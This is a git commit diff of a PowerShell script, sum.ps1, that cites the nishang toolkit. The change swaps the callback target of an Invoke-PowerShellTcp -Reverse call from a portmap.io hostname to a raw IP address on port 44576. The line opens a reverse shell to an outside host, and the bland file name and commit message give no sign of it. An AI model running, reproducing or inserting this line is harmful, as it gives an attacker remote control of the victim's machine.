5d301080cb20e22ac56f8977eb51bd9e5a2dab38
Dark Jimmy <30280420+l3d43r@users.noreply.github.com>
2018-10-11 11:35:03 -0400

    Update sum.ps1

--- sum.ps1
+++ sum.ps1
@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress trunk-44576.portmap.io -Port 44576
+Invoke-PowerShellTcp -Reverse -IPAddress 193.161.193.99 -Port 44576
